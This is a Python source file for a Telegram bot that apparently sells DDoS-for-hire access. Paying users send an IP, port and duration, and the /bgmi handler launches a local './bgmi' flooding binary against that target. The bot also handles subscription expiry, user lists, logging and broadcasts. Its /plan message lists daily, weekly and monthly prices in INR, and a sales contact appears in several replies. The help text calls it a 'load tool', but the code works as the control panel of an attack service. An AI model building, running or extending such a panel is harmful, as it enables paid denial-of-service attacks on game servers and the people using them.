# vm panel bot

import datetime
import logging
import os
import re
import subprocess
import sys
import time
import traceback
from pathlib import Path

from dotenv import load_dotenv
import requests
import telebot
import telebot.apihelper as tg_api

load_dotenv(Path(__file__).resolve().parent / ".env")

# Transient TLS / WinError 10054 to api.telegram.org: pyTelegramBotAPI defaults to NO retries.
tg_api.RETRY_ON_ERROR = True
tg_api.RETRY_ENGINE = 1  # retry loop on ConnectionError / Timeout
tg_api.MAX_RETRIES = 12
tg_api.RETRY_TIMEOUT = 1.25
tg_api.CONNECT_TIMEOUT = 20
tg_api.READ_TIMEOUT = 45
tg_api.session = requests.Session()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
    stream=sys.stdout,
)
log = logging.getLogger("bot")

from keep_alive import keep_alive

keep_alive()

TOKEN = (os.environ.get("TELEGRAM_BOT_TOKEN") or "").strip()
if not TOKEN:
    raise SystemExit("Set TELEGRAM_BOT_TOKEN in .env (see .env.example).")

bot = telebot.TeleBot(TOKEN)

try:
    _me = bot.get_me()
    log.info("Telegram OK: @%s (id=%s)", _me.username, _me.id)
except Exception as e:
    log.error(
        "Cannot talk to Telegram (bad token, network, or firewall). Fix .env / network. Error: %s",
        e,
    )
    raise SystemExit(1) from e

# Admin user IDs (comma-separated in env, or default list)
_raw_admins = os.environ.get("TELEGRAM_ADMIN_IDS", "8400776382")
admin_id = [x.strip() for x in _raw_admins.split(",") if x.strip()]

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Target: IPv4, IPv6-ish, or hostname segment
_TARGET_RE = re.compile(
    r"^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)*[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$|"
    r"^\d{1,3}(\.\d{1,3}){3}$|"
    r"^\[[0-9a-fA-F:]+\]$"
)


def read_users():
    try:
        with open(USER_FILE, "r", encoding="utf-8") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []


allowed_user_ids = read_users()


def log_command(user_id, target, port, duration_sec):
    try:
        user_info = bot.get_chat(user_id)
        username = "@" + user_info.username if user_info.username else f"uid:{user_id}"
    except Exception:
        username = f"uid:{user_id}"

    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(f"User: {username}\nTarget: {target}\nPort: {port}\nTime: {duration_sec}\n\n")


def clear_logs():
    try:
        with open(LOG_FILE, "r+", encoding="utf-8") as file:
            if file.read() == "":
                return "Already empty — log file had no lines."
            file.seek(0)
            file.truncate(0)
            return "OK — log file cleared."
    except FileNotFoundError:
        return "No log.txt file — create one by using the bot first."


def record_command_logs(user_id, command, target=None, port=None, duration=None):
    log_entry = (
        f"UID={user_id} | TS={datetime.datetime.now().isoformat(timespec='seconds')} | CMD={command}"
    )
    if target:
        log_entry += f" | HOST={target}"
    if port is not None:
        log_entry += f" | PORT={port}"
    if duration is not None:
        log_entry += f" | SEC={duration}"

    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(log_entry + "\n")


user_approval_expiry = {}


def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        return str(remaining_time)
    return "—"


def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit in ("hour", "hours"):
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit in ("day", "days"):
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit in ("week", "weeks"):
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit in ("month", "months"):
        expiry_date = current_time + datetime.timedelta(days=30 * duration)
    else:
        return False

    user_approval_expiry[user_id] = expiry_date
    return True


UNAUTHORIZED = "Admin command — you don't have access. @Vm_0011"


@bot.message_handler(commands=["add"])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, UNAUTHORIZED)
        return

    command = message.text.split()
    if len(command) <= 2:
        bot.reply_to(message, "Missing args — use: /add <user_id> <time>  (example: 7days)")
        return

    user_to_add = command[1]
    duration_str = command[2]

    try:
        duration = int(duration_str[:-4])
        if duration <= 0:
            raise ValueError
        time_unit = duration_str[-4:].lower()
        if time_unit not in ("hour", "hours", "day", "days", "week", "weeks", "month", "months"):
            raise ValueError
    except ValueError:
        bot.reply_to(message, "Wrong time format — number + unit, no space (e.g. 3hours, 1weeks).")
        return

    if user_to_add in allowed_user_ids:
        bot.reply_to(message, "Already added — this user ID is already on the list.")
        return

    allowed_user_ids.append(user_to_add)
    with open(USER_FILE, "a", encoding="utf-8") as file:
        file.write(f"{user_to_add}\n")

    if set_approval_expiry_date(user_to_add, duration, time_unit):
        exp = user_approval_expiry[user_to_add].strftime("%Y-%m-%d %H:%M:%S")
        response = f"Added {user_to_add}. Expires {exp}"
    else:
        response = "Couldn't save expiry — try /add again or check bot logs."

    bot.reply_to(message, response)


@bot.message_handler(commands=["myinfo"])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    expiry = user_approval_expiry.get(user_id, "—")
    expiry_str = expiry.strftime("%Y-%m-%d %H:%M") if isinstance(expiry, datetime.datetime) else expiry
    response = (
        f"ID: <code>{user_id}</code>\n"
        f"User: {username}\n"
        f"Role: {user_role}\n"
        f"Expires: {expiry_str}\n"
        f"Left: {remaining_time}"
    )
    bot.reply_to(message, response, parse_mode="HTML")


@bot.message_handler(commands=["remove"])
def remove_user(message):
    chat_user_id = str(message.chat.id)
    if chat_user_id not in admin_id:
        bot.reply_to(message, UNAUTHORIZED)
        return

    command = message.text.split()
    if len(command) <= 1:
        bot.reply_to(message, "Missing user — use: /remove <user_id>")
        return

    user_to_remove = command[1]
    if user_to_remove not in allowed_user_ids:
        bot.reply_to(message, "Not on list — that ID isn't in users.txt.")
        return

    allowed_user_ids.remove(user_to_remove)
    with open(USER_FILE, "w", encoding="utf-8") as file:
        for uid in allowed_user_ids:
            file.write(f"{uid}\n")

    bot.reply_to(message, f"Removed {user_to_remove}.")


@bot.message_handler(commands=["clearlogs"])
def clear_logs_command(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, UNAUTHORIZED)
        return
    bot.reply_to(message, clear_logs())


@bot.message_handler(commands=["clearusers"])
def clear_users_command(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, UNAUTHORIZED)
        return

    global allowed_user_ids
    try:
        with open(USER_FILE, "r+", encoding="utf-8") as file:
            content = file.read()
            if content.strip() == "":
                allowed_user_ids = []
                bot.reply_to(message, "Nothing to clear — user list was already empty.")
                return
            file.seek(0)
            file.truncate(0)
    except FileNotFoundError:
        allowed_user_ids = []
        bot.reply_to(message, "No users.txt yet — file will appear after first /add.")
        return

    allowed_user_ids = []
    bot.reply_to(message, "All users cleared.")


@bot.message_handler(commands=["allusers"])
def show_all_users(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, UNAUTHORIZED)
        return

    try:
        with open(USER_FILE, "r", encoding="utf-8") as file:
            user_ids = file.read().splitlines()
    except FileNotFoundError:
        bot.reply_to(message, "No users.txt — nobody added yet.")
        return

    if not user_ids:
        bot.reply_to(message, "No users in list — add with /add first.")
        return

    response = "Users:\n"
    for line_uid in user_ids:
        try:
            info = bot.get_chat(int(line_uid))
            un = info.username
            response += f"- @{un} (ID: {line_uid})\n"
        except Exception:
            response += f"- tg:{line_uid}\n"
    bot.reply_to(message, response)


@bot.message_handler(commands=["logs"])
def show_recent_logs(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, UNAUTHORIZED)
        return

    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        except FileNotFoundError:
            bot.reply_to(message, "Can't open log.txt — check disk or permissions.")
    else:
        bot.reply_to(message, "Log file empty — /logs has nothing to attach.")


def start_attack_reply(message, target, port, duration_sec):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = (
        f"{username} started.\n"
        f"{target} : {port} : {duration_sec}s\n"
        f"@Vm_0011"
    )
    bot.reply_to(message, response)


bgmi_cooldown = {}
COOLDOWN_TIME = 0  # seconds; 0 disables cooldown


def _validate_bgmi_args(target, port, duration_sec):
    if not _TARGET_RE.match(target):
        return "Invalid target — use IP (e.g. 1.2.3.4) or hostname, no spaces/extra symbols."
    if not (1 <= port <= 65535):
        return "Bad port — use a number from 1 to 65535."
    if not (1 <= duration_sec <= 600):
        return "Bad time — seconds must be between 1 and 600."
    return None


@bot.message_handler(commands=["bgmi"])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "Access denied — your ID must be added by admin. @Vm_0011")
        return

    if user_id not in admin_id:
        if (
            user_id in bgmi_cooldown
            and COOLDOWN_TIME > 0
            and (datetime.datetime.now() - bgmi_cooldown[user_id]).total_seconds() < COOLDOWN_TIME
        ):
            bot.reply_to(
                message,
                f"Cooldown — wait {COOLDOWN_TIME}s before another /bgmi.",
            )
            return
        bgmi_cooldown[user_id] = datetime.datetime.now()

    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "Wrong format — use: /bgmi <ip_or_host> <port> <seconds>  (needs 4 parts)")
        return

    target = parts[1]
    try:
        port = int(parts[2])
        duration_sec = int(parts[3])
    except ValueError:
        bot.reply_to(message, "Type error — port and time must be numbers only (no text).")
        return

    err = _validate_bgmi_args(target, port, duration_sec)
    if err:
        bot.reply_to(message, err)
        return

    record_command_logs(user_id, "/bgmi", target, port, duration_sec)
    log_command(user_id, target, port, duration_sec)
    start_attack_reply(message, target, port, duration_sec)

    try:
        subprocess.run(
            ["./bgmi", target, str(port), str(duration_sec), "500"],
            check=False,
            cwd=os.path.dirname(os.path.abspath(__file__)) or None,
        )
    except OSError as e:
        bot.reply_to(message, f"Binary error — ./bgmi not found or can't run: {e}")
        return

    bot.reply_to(message, f"Finished — {target}:{port} for {duration_sec}s")


@bot.message_handler(commands=["mylogs"])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "Access denied — only added users can use /mylogs.")
        return

    try:
        with open(LOG_FILE, "r", encoding="utf-8") as file:
            command_logs = file.readlines()
    except FileNotFoundError:
        bot.reply_to(message, "No log.txt yet — your history appears after first use.")
        return

    user_logs = [
        line
        for line in command_logs
        if f"UID={user_id}" in line or f"UserID: {user_id}" in line
    ]
    if user_logs:
        bot.reply_to(message, "".join(user_logs))
    else:
        bot.reply_to(message, "Empty — no lines saved under your user ID.")


@bot.message_handler(commands=["help"])
def show_help(message):
    help_text = (
        "<b>Manual</b>\n\n"
        "<b>User commands</b>\n"
        "/start — short welcome\n"
        "/help — this text\n"
        "/rules — limits (spam, one job, bans)\n"
        "/plan — time/price info\n"
        "/myinfo — your ID, name, role (admin/user), access expiry\n"
        "/mylogs — lines from log.txt that match your ID\n"
        "/bgmi — run load tool: <code>/bgmi ip port seconds</code>\n"
        "  (example: <code>/bgmi 192.168.0.1 7777 60</code>)\n"
        "  Only works if admin added your Telegram ID.\n\n"
        "<b>Common errors (quick)</b>\n"
        "• Access denied /bgmi — you're not on the list → @Vm_0011\n"
        "• Wrong format /bgmi — need exactly IP/host, port number, seconds\n"
        "• Invalid target — fix IP or hostname\n"
        "• Bad port — 1–65535 only\n"
        "• Bad time — 1–600 seconds only\n"
        "• Type error port/time — must be digits, not words\n"
        "• Admin command — your ID isn't admin → @Vm_0011\n"
        "• Can't read log.txt — file/permission issue on server\n\n"
        "Sales / ID add: @Vm_0011\n"
    )
    uid = str(message.chat.id)
    if uid in admin_id:
        help_text += "\n<b>Admin</b>: see /admincmd"
    bot.reply_to(message, help_text, parse_mode="HTML")


@bot.message_handler(commands=["start"])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Hi {user_name}. /help\n@Vm_0011"
    bot.reply_to(message, response)


@bot.message_handler(commands=["rules"])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f"""{user_name}:
1. Don't spam.
2. One run at a time.
3. We read logs; abuse = ban."""
    bot.reply_to(message, response)


@bot.message_handler(commands=["plan"])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f"""{user_name}
300s max, 10s gap, 5 slots
Day 80 | Week 400 | Month 1000 (INR)
@Vm_0011
"""
    bot.reply_to(message, response)


@bot.message_handler(commands=["admincmd"])
def welcome_admincmd(message):
    user_name = message.from_user.first_name
    response = f"""{user_name} — admin tools:
/add id time — add user (e.g. 7days)
/remove id — remove user
/allusers — list users
/logs — download log.txt
/broadcast text — message all users
/clearlogs — delete log contents
/clearusers — delete all users
"""
    bot.reply_to(message, response)


@bot.message_handler(commands=["broadcast"])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Admin only — use an admin Telegram ID.")
        return

    command = message.text.split(maxsplit=1)
    if len(command) <= 1:
        bot.reply_to(message, "Missing text — use: /broadcast your message here")
        return

    message_to_broadcast = "Admin:\n" + command[1]
    try:
        with open(USER_FILE, "r", encoding="utf-8") as file:
            user_ids = file.read().splitlines()
    except FileNotFoundError:
        bot.reply_to(message, "Can't broadcast — no user list file; /add someone first.")
        return

    for uid in user_ids:
        try:
            bot.send_message(uid, message_to_broadcast)
        except Exception as e:
            print(f"Broadcast skip uid={uid}: {e}")

    bot.reply_to(message, "Sent. (Failed DMs only show in server console.)")


def _run_polling():
    # More resilient than polling(); reconnects on network blips.
    bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=20)


while True:
    try:
        _run_polling()
        log.warning("infinity_polling returned unexpectedly; restarting in 3s")
    except Exception as e:
        log.error("Polling error: %s\n%s", e, traceback.format_exc())
    time.sleep(3)
